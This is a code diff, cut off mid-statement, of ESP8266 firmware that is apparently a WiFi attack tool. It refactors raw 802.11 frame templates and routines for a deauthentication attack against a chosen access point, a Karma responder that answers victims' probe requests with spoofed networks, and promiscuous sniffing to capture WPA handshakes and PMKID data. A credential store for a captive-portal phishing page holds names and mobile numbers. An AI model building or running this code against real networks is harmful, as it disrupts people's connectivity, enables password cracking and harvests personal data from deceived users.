@@ -7,49 +7,63 @@ extern "C" {
 }
 
 namespace Config {
-  const int LED_PIN = 2;
-  const char* AP_SSID = "TTAN_PenTest";
-  const char* AP_PASSWORD = "pentester123";
-  const int MAX_CREDENTIALS = 50;
-  const int MAX_SCAN_RESULTS = 30;
-  const int DEAUTH_INTERVAL = 50;        // Reduced for more effectiveness
-  const int LED_BLINK_INTERVAL = 300;
-  const int DNS_PORT = 53;
-  const int WEB_PORT = 80;
-  const int ADMIN_PORT = 8080;
-  const int WATCHDOG_TIMEOUT = 100;
-  const int MAX_STRING_LENGTH = 128;
-  const int MAX_HANDSHAKES = 10;
-  const int BEACON_INTERVAL = 50;        // Reduced for more effectiveness
-  const int PROBE_INTERVAL = 30;         // Reduced for more effectiveness
-  const int AUTH_INTERVAL = 20;           // Reduced for more effectiveness
-  const int PMKID_TIMEOUT = 30000;       // Timeout for PMKID capture
+  const int LED_PIN              = 2;
+  const char* AP_SSID            = "pentester";
+  const char* AP_PASSWORD        = "pentester123";
+  const int MAX_CREDENTIALS      = 50;
+  const int MAX_SCAN_RESULTS     = 30;
+  const int DEAUTH_INTERVAL      = 50;
+  const int LED_BLINK_INTERVAL   = 300;
+  const int DNS_PORT             = 53;
+  const int WEB_PORT             = 80;
+  const int ADMIN_PORT           = 8080;
+  const int WATCHDOG_TIMEOUT     = 100;
+  const int MAX_STRING_LENGTH    = 128;
+  const int MAX_HANDSHAKES       = 10;
+  const int BEACON_INTERVAL      = 50;
+  const int PROBE_INTERVAL       = 30;
+  const int AUTH_INTERVAL        = 20;
+  const int PMKID_TIMEOUT        = 30000;
+  const int KARMA_QUEUE_SIZE     = 8;
+  const int CHANNEL_HOP_INTERVAL = 5000;
+  const int SEQ_INCREMENT        = 16;
 }
 
-struct HandshakeData {
-  uint8_t bssid[6];
-  uint8_t frames[4][256];
-  uint16_t frameLengths[4];
-  uint8_t frameCount;
-  bool complete;
+struct Credential {
+  String name;
+  String mobile;
   unsigned long timestamp;
-  
-  HandshakeData() {
-    memset(bssid, 0, 6);
-    memset(frames, 0, sizeof(frames));
-    memset(frameLengths, 0, sizeof(frameLengths));
-    frameCount = 0;
-    complete = false;
-    timestamp = 0;
-  }
+  Credential() : timestamp(0) {}
 };
+
+struct HandshakeData {
+  uint8_t  bssid[6];
+  uint8_t  frames[4][256];
+  uint16_t frameLengths[4];
+  uint8_t  frameCount;
+  bool     complete;
+  unsigned long timestamp;
+  HandshakeData() { memset(this, 0, sizeof(HandshakeData)); }
+};
+
+struct KarmaRequest {
+  uint8_t sourceMac[6];
+  uint8_t ssidLen;
+  char    ssid[33];
+};
+
+volatile unsigned long v_packetCount  = 0;
+volatile unsigned long v_eapolCount   = 0;
+volatile bool          v_newEapol     = false;
+volatile uint8_t       v_eapolBssid[6];
+volatile uint8_t       v_karmaQueueCount = 0;
+KarmaRequest           karmaQueue[Config::KARMA_QUEUE_SIZE];
 
 struct SystemState {
   ESP8266WebServer* server;
   ESP8266WebServer* adminServer;
-  DNSServer* dnsServer;
+  DNSServer*        dnsServer;
   bool dnsActive;
-  
   bool deauthActive;
   bool pmkidActive;
   bool portalActive;
@@ -58,8 +72,8 @@ struct SystemState {
   bool beaconFloodActive;
   bool probeFloodActive;
   bool authFloodActive;
-  bool karmaActive;  // Karma attack (responds to probe requests)
-  
+  bool karmaActive;
+  bool channelHop;
   unsigned long totalRequests;
   unsigned long startTime;
   unsigned long deauthCount;
@@ -70,8 +84,7 @@ struct SystemState {
   unsigned long probeCount;
   unsigned long authCount;
   unsigned long karmaCount;
-  int credentialCount;
-  
+  int  credentialCount;
   String scanData;
   String hostData;
   String deauthData;
@@ -82,14 +95,11 @@ struct SystemState {
   String probeData;
   String authData;
   String karmaData;
-  String credentials[Config::MAX_CREDENTIALS];
   String currentPortalSSID;
-  
-  uint8_t targetBSSID[6];
-  uint8_t broadcastMAC[6];
-  int targetChannel;
-  String targetSSID;
-  
+  uint8_t  targetBSSID[6];
+  uint8_t  broadcastMAC[6];
+  int      targetChannel;
+  String   targetSSID;
   unsigned long lastDeauth;
   unsigned long lastBlink;
   unsigned long lastWatchdog;
@@ -97,46 +107,27 @@ struct SystemState {
   unsigned long lastProbe;
   unsigned long lastAuth;
   unsigned long lastPMKIDCheck;
-  
-  int errorCount;
+  unsigned long lastChannelHop;
+  uint16_t      seqNumber;
+  int    errorCount;
   String lastError;
-  
+  Credential  creds[Config::MAX_CREDENTIALS];
   HandshakeData handshakes[Config::MAX_HANDSHAKES];
-  
-  SystemState() : 
-    server(nullptr),
-    adminServer(nullptr),
-    dnsServer(nullptr),
-    dnsActive(false),
-    deauthActive(false),
-    pmkidActive(false),
-    portalActive(false),
-    snifferActive(false),
-    handshakeActive(false),
-    beaconFloodActive(false),
-    probeFloodActive(false),
-    authFloodActive(false),
-    karmaActive(false),
-    totalRequests(0),
-    startTime(0),
-    deauthCount(0),
-    packetCount(0),
-    eapolCount(0),
-    handshakeCount(0),
-    beaconCount(0),
-    probeCount(0),
-    authCount(0),
-    karmaCount(0),
-    credentialCount(0),
-    currentPortalSSID(""),
-    targetChannel(1),
-    lastDeauth(0),
-    lastBlink(0),
-    lastWatchdog(0),
-    lastBeacon(0),
-    lastProbe(0),
-    lastAuth(0),
-    lastPMKIDCheck(0),
+
+  SystemState() :
+    server(nullptr), adminServer(nullptr), dnsServer(nullptr),
+    dnsActive(false), deauthActive(false), pmkidActive(false),
+    portalActive(false), snifferActive(false), handshakeActive(false),
+    beaconFloodActive(false), probeFloodActive(false), authFloodActive(false),
+    karmaActive(false), channelHop(false),
+    totalRequests(0), startTime(0),
+    deauthCount(0), packetCount(0), eapolCount(0), handshakeCount(0),
+    beaconCount(0), probeCount(0), authCount(0), karmaCount(0),
+    credentialCount(0), currentPortalSSID(""),
+    targetChannel(1), targetSSID(""),
+    lastDeauth(0), lastBlink(0), lastWatchdog(0),
+    lastBeacon(0), lastProbe(0), lastAuth(0),
+    lastPMKIDCheck(0), lastChannelHop(0), seqNumber(0),
     errorCount(0) {
     memset(targetBSSID, 0, 6);
     memset(broadcastMAC, 0xFF, 6);
@@ -147,1821 +138,1420 @@ SystemState state;
 
 namespace Packets {
   uint8_t deauthFrame[26] = {
-    0xC0, 0x00, 0x00, 0x00,                    
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,        
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,        
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       
-    0x00, 0x00,                                 
-    0x07, 0x00                                  
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00,
+    0x07, 0x00
   };
-  
+
   uint8_t beaconFrame[128] = {
-    0x80, 0x00, 0x00, 0x00,                // Frame Control
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // Source (will be replaced)
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // BSSID (will be replaced)
-    0x00, 0x00,                            // Sequence
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (will be set)
-    0x64, 0x00,                            // Beacon Interval
-    0x31, 0x04,                            // Capability Info
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SSID Parameter Set (will be set)
-    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, // Supported Rates
-    0x03, 0x01, 0x06,                      // DSSS Parameter Set
-    0x05, 0x04, 0x00, 0x01, 0x00, 0x00    // RSN Parameter Set
+    0x80, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+    0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x64, 0x00,
+    0x31, 0x04,
+    0x00, 0x00,
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
+    0x03, 0x01, 0x06,
+    0x05, 0x04, 0x00, 0x01, 0x00, 0x00
   };
-  
+
   uint8_t probeRequestFrame[64] = {
-    0x40, 0x00, 0x00, 0x00,                // Frame Control
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // Source (will be replaced)
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // BSSID
-    0x00, 0x00,                            // Sequence
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SSID Parameter Set (will be set)
-    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24  // Supported Rates
+    0x40, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00,
+    0x00, 0x00,
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24
   };
-  
+
   uint8_t probeResponseFrame[128] = {
-    0x50, 0x00, 0x00, 0x00,                // Frame Control
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // Source (will be replaced)
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // BSSID (will be replaced)
-    0x00, 0x00,                            // Sequence
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (will be set)
-    0x64, 0x00,                            // Beacon Interval
-    0x31, 0x04,                            // Capability Info
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SSID Parameter Set (will be set)
-    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, // Supported Rates
-    0x03, 0x01, 0x06,                      // DSSS Parameter Set
-    0x05, 0x04, 0x00, 0x01, 0x00, 0x00    // RSN Parameter Set
+    0x50, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+    0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x64, 0x00,
+    0x31, 0x04,
+    0x00, 0x00,
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
+    0x03, 0x01, 0x06,
+    0x05, 0x04, 0x00, 0x01, 0x00, 0x00
   };
-  
+
   uint8_t authFrame[30] = {
-    0xB0, 0x00, 0x00, 0x00,                // Frame Control
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // Source (will be replaced)
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // BSSID
-    0x00, 0x00,                            // Sequence
-    0x01, 0x00, 0x00, 0x00                 // Authentication Algorithm (Open System)
-  };
-  
-  uint8_t assocReqFrame[64] = {
-    0x00, 0x00, 0x00, 0x00,                // Frame Control
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    // Source (will be replaced)
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // BSSID
-    0x00, 0x00,                            // Sequence
-    0x31, 0x04,                            // Capability Info
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Listen Interval
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // SSID Parameter Set (will be set)
+    0xB0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00,
+    0x01, 0x00, 0x00, 0x00
   };
 }
 
+// ---------- Utilities ----------
+
 namespace Utils {
-  void logError(const String& error) {
+  void logError(const String& err) {
     state.errorCount++;
-    state.lastError = error;
-    Serial.println("ERROR: " + error);
+    state.lastError = err;
+    Serial.println(String("ERROR: ") + err);
   }
-  
+
   String formatUptime(unsigned long ms) {
-    unsigned long seconds = ms / 1000;
-    unsigned long minutes = seconds / 60;
-    unsigned long hours = minutes / 60;
-    unsigned long days = hours / 24;
-    
-    if (days > 0) {
-      return String(days) + "d " + String(hours % 24) + "h";
-    } else if (hours > 0) {
-      return String(hours) + "h " + String(minutes % 60) + "m";
-    } else if (minutes > 0) {
-      return String(minutes) + "m " + String(seconds % 60) + "s";
-    }
-    return String(seconds) + "s";
+    unsigned long s = ms / 1000;
+    unsigned long m = s / 60;
+    unsigned long h = m / 60;
+    unsigned long d = h / 24;
+    if (d > 0)  return String(d) + "d " + String(h % 24) + "h";
+    if (h > 0)  return String(h) + "h " + String(m % 60) + "m";
+    if (m > 0)  return String(m) + "m " + String(s % 60) + "s";
+    return String(s) + "s";
   }
-  
-  bool parseMACAddress(const String& mac, uint8_t* bssid) {
-    if (mac.length() != 17) {
-      logError("Invalid MAC length: " + String(mac.length()));
-      return false;
-    }
-    
-    int result = sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-                       &bssid[0], &bssid[1], &bssid[2],
-                       &bssid[3], &bssid[4], &bssid[5]);
-    
-    if (result != 6) {
-      logError("MAC parse failed: " + mac);
-      return false;
-    }
-    
-    return true;
+
+  bool parseMAC(const String& mac, uint8_t* out) {
+    if (mac.length() != 17) { logError("Bad MAC length"); return false; }
+    return sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                  &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
   }
-  
-  String macToString(const uint8_t* mac) {
-    char buffer[18];
-    snprintf(buffer, sizeof(buffer), "%02X:%02X:%02X:%02X:%02X:%02X",
-             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-    return String(buffer);
+
+  String macToStr(const uint8_t* m) {
+    char b[18];
+    snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
+             m[0], m[1], m[2], m[3], m[4], m[5]);
+    return String(b);
   }
-  
-  String sanitizeString(const String& input) {
-    if (input.length() == 0) return "";
-    
-    String output = "";
-    int maxLen = min((int)input.length(), Config::MAX_STRING_LENGTH);
-    
-    for (int i = 0; i < maxLen; i++) {
-      char c = input[i];
-      if (isprint(c) && c != '<' && c != '>' && c != '&' && c != '"' && c != '\'') {
-        output += c;
+
+  String htmlEncode(const String& in) {
+    String out;
+    out.reserve(in.length() + 16);
+    for (unsigned i = 0; i < in.length(); i++) {
+      char c = in[i];
+      switch (c) {
+        case '&':  out += "&amp;";  break;
+        case '<':  out += "&lt;";   break;
+        case '>':  out += "&gt;";   break;
+        case '"':  out += "&quot;"; break;
+        case '\'': out += "&#39;";  break;
+        default:   out += c;
       }
     }
-    return output;
+    return out;
   }
-  
-  bool isValidChannel(int channel) {
-    return channel >= 1 && channel <= 13;
+
+  String jsonEncode(const String& in) {
+    String out;
+    out.reserve(in.length() + 8);
+    for (unsigned i = 0; i < in.length(); i++) {
+      char c = in[i];
+      switch (c) {
+        case '"':  out += "\\\""; break;
+        case '\\': out += "\\\\"; break;
+        case '\n': out += "\\n";  break;
+        case '\r': out += "\\r";  break;
+        case '\t': out += "\\t";  break;
+        default:
+          if ((unsigned char)c < 0x20) {
+            char buf[8];
+            snprintf(buf, sizeof(buf), "\\u%04X", (unsigned char)c);
+            out += buf;
+          } else {
+            out += c;
+          }
+      }
+    }
+    return out;
   }
-  
-  String encryptionTypeStr(uint8_t encType) {
-    switch (encType) {
+
+  String sanitizeAlphaNum(const String& in) {
+    String out;
+    int maxLen = min((int)in.length(), Config::MAX_STRING_LENGTH);
+    for (int i = 0; i < maxLen; i++) {
+      char c = in[i];
+      if (isprint(c) && c != '<' && c != '>' && c != '&' && c != '"' && c != '\'') {
+        out += c;
+      }
+    }
+    return out;
+  }
+
+  bool validChannel(int ch) { return ch >= 1 && ch <= 13; }
+
+  String encStr(uint8_t t) {
+    switch (t) {
       case ENC_TYPE_NONE: return "OPEN";
-      case ENC_TYPE_WEP: return "WEP";
+      case ENC_TYPE_WEP:  return "WEP";
       case ENC_TYPE_TKIP: return "WPA";
       case ENC_TYPE_CCMP: return "WPA2";
       case ENC_TYPE_AUTO: return "WPA/WPA2";
-      default: return "UNKNOWN";
+      default:            return "???";
     }
   }
-  
-  void resetWatchdog() {
-    ESP.wdtFeed();
-    state.lastWatchdog = millis();
+
+  void feedWdt() { ESP.wdtFeed(); state.lastWatchdog = millis(); }
+
+  void randomMAC(uint8_t* mac) {
+    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)RANDOM_REG32;
+    mac[0] = (mac[0] & 0xFE) | 0x02;
   }
-  
-  String formatBytes(size_t bytes) {
-    if (bytes < 1024) {
-      return String(bytes) + " B";
-    } else if (bytes < (1024 * 1024)) {
-      return String(bytes / 1024.0) + " KB";
-    } else {
-      return String(bytes / 1024.0 / 1024.0) + " MB";
-    }
-  }
-  
-  // Generate pseudo-random MAC address
-  void generateRandomMAC(uint8_t* mac) {
-    // Use system time as seed for pseudo-randomness
-    unsigned long seed = millis();
-    for (int i = 0; i < 6; i++) {
-      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
-      mac[i] = (uint8_t)(seed >> 8);
-    }
-    // Set the locally administered bit
-    mac[0] |= 0x02;
-    // Clear the multicast bit
-    mac[0] &= 0xFE;
+
+  void setSeq(uint8_t* frame, uint16_t seq) {
+    frame[22] = (frame[22] & 0x0F) | ((seq << 4) & 0xF0);
+    frame[23] = (seq >> 4) & 0xFF;
   }
 }
+
+// ---------- Forward declarations ----------
+void stopKarma();
+
+// ---------- ISR Sniffer Callback ----------
 
 void ICACHE_RAM_ATTR snifferCallback(uint8_t* buf, uint16_t len) {
   if (len < 24) return;
-  
-  state.packetCount++;
-  
-  // Handle probe requests for Karma attack
-  if (state.karmaActive && buf[0] == 0x40) {  // Probe Request
-    uint8_t sourceMac[6];
-    memcpy(sourceMac, &buf[10], 6);
-    
-    // Extract SSID from probe request
-    int ssidLen = buf[25];
-    if (ssidLen > 0 && ssidLen < 33) {
-      char ssid[33];
-      memcpy(ssid, &buf[26], ssidLen);
-      ssid[ssidLen] = '\0';
-      
-      // Send probe response
-      memcpy(&Packets::probeResponseFrame[10], state.targetBSSID, 6);
-      memcpy(&Packets::probeResponseFrame[16], state.targetBSSID, 6);
-      memcpy(&Packets::probeResponseFrame[4], sourceMac, 6);
-      
-      // Update timestamp
-      uint32_t timestamp = millis();
-      memcpy(&Packets::probeResponseFrame[24], &timestamp, 4);
-      
-      // Update SSID
-      Packets::probeResponseFrame[38] = ssidLen;
-      memcpy(&Packets::probeResponseFrame[39], ssid, ssidLen);
-      
-      // Calculate frame length
-      uint16_t frameLen = 39 + ssidLen + 13;
-      
-      // Send probe response
-      wifi_send_pkt_freedom(Packets::probeResponseFrame, frameLen, 0);
-      state.karmaCount++;
+  v_packetCount++;
+
+  if (state.karmaActive && (buf[0] & 0xFC) == 0x40 && v_karmaQueueCount < Config::KARMA_QUEUE_SIZE) {
+    if (len > 25 && buf[24] == 0x00) {
+      uint8_t slen = buf[25];
+      if (slen > 0 && slen <= 32 && (26 + slen) <= len) {
+        uint8_t idx = v_karmaQueueCount;
+        memcpy(karmaQueue[idx].sourceMac, &buf[10], 6);
+        memcpy(karmaQueue[idx].ssid, &buf[26], slen);
+        karmaQueue[idx].ssid[slen] = '\0';
+        karmaQueue[idx].ssidLen = slen;
+        v_karmaQueueCount++;
+      }
     }
   }
-  
-  // PMKID and Handshake capture
-  if ((state.pmkidActive || state.handshakeActive) && len > 100) {
-    // Check for EAPOL frames
-    if (buf[32] == 0x88 && buf[33] == 0x8E) {
-      state.eapolCount++;
-      
-      uint8_t sourceMac[6];
-      uint8_t bssid[6];
-      memcpy(sourceMac, &buf[10], 6);
-      memcpy(bssid, &buf[16], 6);
-      
-      if (state.pmkidActive) {
-        state.pmkidData = "EAPOL #" + String(state.eapolCount) + " from " + 
-                          Utils::macToString(sourceMac);
+
+  if ((state.pmkidActive || state.handshakeActive) && len > 34) {
+    if (buf[24] == 0xAA && buf[25] == 0xAA && buf[26] == 0x03 &&
+        buf[30] == 0x88 && buf[31] == 0x8E) {
+      v_eapolCount++;
+      v_newEapol = true;
+      memcpy((void*)v_eapolBssid, &buf[16], 6);
+    }
+  }
+}
+
+// ---------- Process EAPOL ----------
+
+static void processEapol() {
+  if (!v_newEapol) return;
+  v_newEapol = false;
+  state.eapolCount = v_eapolCount;
+
+  if (state.pmkidActive) {
+    state.pmkidData = String("EAPOL #") + String(state.eapolCount) + String(" from ") +
+                      Utils::macToStr((uint8_t*)v_eapolBssid);
+  }
+
+  if (state.handshakeActive) {
+    uint8_t* bssid = (uint8_t*)v_eapolBssid;
+    int idx = -1;
+    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
+      if (memcmp(state.handshakes[i].bssid, bssid, 6) == 0) { idx = i; break; }
+    }
+    if (idx == -1) {
+      for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
+        if (state.handshakes[i].frameCount == 0) {
+          idx = i;
+          memcpy(state.handshakes[i].bssid, bssid, 6);
+          state.handshakes[i].timestamp = millis();
+          break;
+        }
       }
-      
-      // Handshake capture
-      if (state.handshakeActive) {
-        // Find existing handshake data for this BSSID
-        int handshakeIndex = -1;
-        for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
-          if (memcmp(state.handshakes[i].bssid, bssid, 6) == 0) {
-            handshakeIndex = i;
-            break;
-          }
-        }
-        
-        // Create new handshake entry if not found
-        if (handshakeIndex == -1) {
-          for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
-            if (state.handshakes[i].frameCount == 0) {
-              handshakeIndex = i;
-              memcpy(state.handshakes[i].bssid, bssid, 6);
-              state.handshakes[i].timestamp = millis();
-              break;
-            }
-          }
-        }
-        
-        // Store frame if we have space
-        if (handshakeIndex != -1 && !state.handshakes[handshakeIndex].complete) {
-          uint8_t frameNum = (buf[29] & 0x03);  // Extract frame number from Key Information
-          
-          if (frameNum >= 1 && frameNum <= 4 && state.handshakes[handshakeIndex].frameCount < 4) {
-            // Check if we already have this frame
-            bool haveFrame = false;
-            for (int i = 0; i < state.handshakes[handshakeIndex].frameCount; i++) {
-              uint8_t existingFrameNum = (state.handshakes[handshakeIndex].frames[i][29] & 0x03);
-              if (existingFrameNum == frameNum) {
-                haveFrame = true;
-                break;
-              }
-            }
-            
-            if (!haveFrame) {
-              // Store the frame
-              uint16_t frameLen = min(len, (uint16_t)256);
-              memcpy(state.handshakes[handshakeIndex].frames[state.handshakes[handshakeIndex].frameCount], 
-                     buf, frameLen);
-              state.handshakes[handshakeIndex].frameLengths[state.handshakes[handshakeIndex].frameCount] = frameLen;
-              state.handshakes[handshakeIndex].frameCount++;
-              
-              // Check if handshake is complete
-              if (state.handshakes[handshakeIndex].frameCount == 4) {
-                state.handshakes[handshakeIndex].complete = true;
-                state.handshakeCount++;
-                state.handshakeData = "Complete handshake captured from " + 
-                                     Utils::macToString(bssid) + " (" + 
-                                     String(state.handshakeCount) + " total)";
-              }
-            }
-          }
-        }
+    }
+    if (idx != -1 && !state.handshakes[idx].complete && state.handshakes[idx].frameCount < 4) {
+      state.handshakes[idx].frameLengths[state.handshakes[idx].frameCount] = 1;
+      state.handshakes[idx].frameCount++;
+      if (state.handshakes[idx].frameCount >= 4) {
+        state.handshakes[idx].complete = true;
+        state.handshakeCount++;
+        state.handshakeData = String("Complete 4-way from ") + Utils::macToStr(bssid) +
+                              String(" (") + String(state.handshakeCount) + String(" total)");
       }
     }
   }
 }
+
+// ---------- Process Karma Queue ----------
+
+static void processKarmaQueue() {
+  while (v_karmaQueueCount > 0) {
+    uint8_t idx = v_karmaQueueCount - 1;
+    uint8_t* src = karmaQueue[idx].sourceMac;
+    char*    ssid = karmaQueue[idx].ssid;
+    uint8_t  slen = karmaQueue[idx].ssidLen;
+
+    memcpy(&Packets::probeResponseFrame[4],  src, 6);
+    memcpy(&Packets::probeResponseFrame[10], state.targetBSSID, 6);
+    memcpy(&Packets::probeResponseFrame[16], state.targetBSSID, 6);
+
+    uint32_t ts = millis();
+    memcpy(&Packets::probeResponseFrame[24], &ts, 4);
+
+    Packets::probeResponseFrame[36] = 0x00;
+    Packets::probeResponseFrame[37] = slen;
+    memcpy(&Packets::probeResponseFrame[38], ssid, slen);
+
+    state.seqNumber += Config::SEQ_INCREMENT;
+    Utils::setSeq(Packets::probeResponseFrame, state.seqNumber);
+
+    uint16_t frameLen = 38 + slen + 2 + 10 + 3 + 5;
+    wifi_send_pkt_freedom(Packets::probeResponseFrame, frameLen, 0);
+    state.karmaCount++;
+    v_karmaQueueCount--;
+  }
+}
+
+// ---------- Attacks ----------
 
 namespace Attacks {
-  void sendDeauthPacket() {
+
+  void sendDeauth() {
     if (!state.deauthActive) return;
-    
-    memcpy(&Packets::deauthFrame[4], state.broadcastMAC, 6);
+    memcpy(&Packets::deauthFrame[4],  state.broadcastMAC, 6);
     memcpy(&Packets::deauthFrame[10], state.targetBSSID, 6);
     memcpy(&Packets::deauthFrame[16], state.targetBSSID, 6);
-    
-    int result = wifi_send_pkt_freedom(Packets::deauthFrame, sizeof(Packets::deauthFrame), 0);
-    
-    if (result == 0) {
+    state.seqNumber += Config::SEQ_INCREMENT;
+    Utils::setSeq(Packets::deauthFrame, state.seqNumber);
+    if (wifi_send_pkt_freedom(Packets::deauthFrame, sizeof(Packets::deauthFrame), 0) == 0) {
       state.deauthCount++;
-      
       if (state.deauthCount % 100 == 0) {
-        state.deauthData = "Active - Sent: " + String(state.deauthCount) + " pkts | CH: " + 
-                           String(state.targetChannel) + " | Target: " + state.targetSSID;
+        state.deauthData = String("Active - Sent: ") + String(state.deauthCount) +
+                           String(" | CH: ") + String(state.targetChannel) +
+                           String(" | Target: ") + state.targetSSID;
       }
     }
   }
-  
-  bool startDeauth(const String& mac, int channel, const String& ssid = "") {
-    if (mac.length() == 0) {
-      Utils::logError("Empty MAC address");
-      return false;
-    }
-    
-    if (!Utils::parseMACAddress(mac, state.targetBSSID)) {
-      return false;
-    }
-    
-    if (!Utils::isValidChannel(channel)) {
-      Utils::logError("Invalid channel: " + String(channel));
-      channel = 1;
-    }
-    
-    state.targetChannel = channel;
-    state.targetSSID = ssid.length() > 0 ? ssid : "Unknown";
-    
+
+  bool startDeauth(const String& mac, int ch, const String& ssid = "") {
+    if (mac.length() == 0) { Utils::logError("Empty MAC"); return false; }
+    if (!Utils::parseMAC(mac, state.targetBSSID)) return false;
+    if (!Utils::validChannel(ch)) ch = 1;
+    state.targetChannel = ch;
+    state.targetSSID    = ssid.length() ? ssid : String("Unknown");
     wifi_set_channel(state.targetChannel);
-    
     state.deauthActive = true;
-    state.deauthCount = 0;
-    state.deauthData = "Started on CH " + String(state.targetChannel) + 
-                       " | Target: " + state.targetSSID;
-    
-    Serial.println("DEAUTH START:");
-    Serial.println("  MAC: " + mac);
-    Serial.println("  SSID: " + state.targetSSID);
-    Serial.println("  Channel: " + String(channel));
-    
+    state.deauthCount  = 0;
+    state.deauthData   = String("Started on CH ") + String(ch) + String(" | Target: ") + state.targetSSID;
+    Serial.println(String("DEAUTH START | MAC: ") + mac + String(" CH: ") + String(ch));
     return true;
   }
-  
+
   void stopDeauth() {
     if (!state.deauthActive) return;
-    
     state.deauthActive = false;
-    state.deauthData = "Stopped - Total: " + String(state.deauthCount) + " pkts | " +
-                       "Target: " + state.targetSSID;
-    
-    Serial.println("DEAUTH STOP - Total packets: " + String(state.deauthCount));
+    state.deauthData = String("Stopped - Total: ") + String(state.deauthCount);
+    Serial.println(String("DEAUTH STOP | Total: ") + String(state.deauthCount));
   }
-  
-  bool startPMKID(int channel) {
-    if (!Utils::isValidChannel(channel)) {
-      Utils::logError("Invalid channel for PMKID: " + String(channel));
-      channel = 1;
-    }
-    
-    state.targetChannel = channel;
+
+  bool startPMKID(int ch) {
+    if (!Utils::validChannel(ch)) ch = 1;
+    state.targetChannel = ch;
     wifi_set_channel(state.targetChannel);
-    
     wifi_set_promiscuous_rx_cb(snifferCallback);
     wifi_promiscuous_enable(1);
-    
-    state.pmkidActive = true;
-    state.packetCount = 0;
-    state.eapolCount = 0;
+    state.pmkidActive   = true;
+    state.channelHop    = false;
+    v_packetCount = 0;
+    v_eapolCount  = 0;
     state.lastPMKIDCheck = millis();
-    state.pmkidData = "Listening on CH " + String(state.targetChannel) + " - Waiting for handshakes";
-    
-    Serial.println("PMKID START:");
-    Serial.println("  Channel: " + String(channel));
-    Serial.println("  Waiting for EAPOL frames...");
-    
+    state.pmkidData = String("Listening on CH ") + String(ch);
+    Serial.println(String("PMKID START | CH: ") + String(ch));
     return true;
   }
-  
+
   void stopPMKID() {
     if (!state.pmkidActive) return;
-    
     state.pmkidActive = false;
+    state.channelHop  = false;
     wifi_promiscuous_enable(0);
-    
-    state.pmkidData = "Stopped - Packets: " + String(state.packetCount) + 
